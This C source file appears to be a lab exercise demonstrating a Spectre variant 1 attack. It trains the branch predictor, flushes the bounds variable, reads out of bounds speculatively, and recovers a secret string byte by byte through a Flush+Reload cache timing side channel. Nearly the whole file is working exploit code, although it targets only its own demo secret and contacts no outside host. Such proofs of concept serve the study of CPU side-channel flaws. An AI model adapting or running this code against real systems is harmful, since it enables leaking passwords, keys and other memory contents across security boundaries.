#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#define CACHE_HIT_THRESHOLD 200 // For Chuck
#define NUM_ATTACKS 1000
#define BUSY_WAIT 5000000  // Adjust based on trial/error

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
char    *secret    = "Some Secret Value";

typedef struct datablock {
        uint8_t lpad[1000];
        uint8_t rpad[1000];
        uint8_t dat;

} DataBlock;

DataBlock array[256];


/**
 * Sandbox Function - Returns the value of the buffer if you are making a request within
 * its bounds, otherwise returns 0.
 */
uint8_t restrictedAccess(size_t x) {
        if (x <= bound_upper && x >= bound_lower) {
                return buffer[x];
        } else {
                return 0;
        }
}

void flushSideChannel() {
    for (int i = 0; i < 256; i++) {
                                array[i].dat = 0;
        _mm_clflush(&array[i].dat);
    }
}


int reloadSideChannel() {
        uint64_t start, end;
        int access=0;
        volatile uint8_t *addr;
        int secret = -1;
        uint64_t best_cycles = -1;

        for (int i = 0; i < 256; i++) {
                addr = &array[i].dat;
                start = __rdtscp(&access);
                access = *addr;
                end = __rdtscp(&access);
                uint64_t cycles = end - start;
                //printf("cycles: %lu, index: %d\n", cycles, i);
                if (cycles <= CACHE_HIT_THRESHOLD && cycles < best_cycles) {
                        best_cycles = cycles;
                        secret = i;
                }
        }

        return secret;
}


/**
 * Abuse the spectre principle to steal a secret. After calling this
 * function, the cache should be setup in such a way that we can extract the
 * secret value, which is saved at the normally inaccessible location buffer[larger_x]
 */
void spectreAttack(size_t larger_x) {
 volatile int junk = 0;

 // Train the branch predictor
 for (int i = 0; i < 1000; i++) {
        _mm_clflush(&bound_upper);
        restrictedAccess(5);  // In-bounds access to train predictor
        }

        // Flush the bound check to force CPU to speculate
        _mm_clflush(&bound_upper);

        // Make speculative access to out-of-bounds secret
        uint8_t value = restrictedAccess(larger_x);  // This may speculatively return secret[0]
        array[value].dat += 1;                       // Access side channel based on secret

 }



 void busy_wait() {
        volatile int dummy = 0;
        for (int i = 0; i < BUSY_WAIT; i++) {
                dummy++;
        }
 }

 int main() {
     int results[256] = {0};//frequency array
     size_t secret_len = strlen(secret);
     char recovered[100] = {0};

     printf("Stealing secret string of length %zu at address %p\n", secret_len, secret);

     for (size_t byte_index = 0; byte_index < secret_len; byte_index++) {
         memset(results, 0, sizeof(results));  //frequency array used for each byte: reset

         size_t index_beyond = (size_t)((size_t)(secret + byte_index) - (size_t)buffer);
         printf("\n[Byte %zu] Targeting offset %zu (secret[%zu] = '%c')\n", byte_index, index_beyond, byte_index, secret[byte_index]);

         for (int i = 0; i < NUM_ATTACKS; i++) {
             flushSideChannel();
             spectreAttack(index_beyond);
             int leaked = reloadSideChannel();

             if (leaked > 0) {
                 results[leaked]++;
             }

             busy_wait();//delay
         }

         // Analyze results
         int best_guess = -1;
         int max_count = 0;

         for (int i = 1; i < 256; i++) {
             if (results[i] > max_count) {
                 max_count = results[i];
                 best_guess = i;
             }
         }

         if (best_guess != -1) {
             recovered[byte_index] = (char)best_guess;
             printf("Recovered byte: %d (%c) with %d hits.\n", best_guess, best_guess, max_count);
         } else {
             recovered[byte_index] = '?';//failed guess
             printf("Failed to recover byte %zu.\n", byte_index);
         }
     }

     printf("\nRecovered Secret String: \"%s\"\n", recovered);

     return 0;
 }

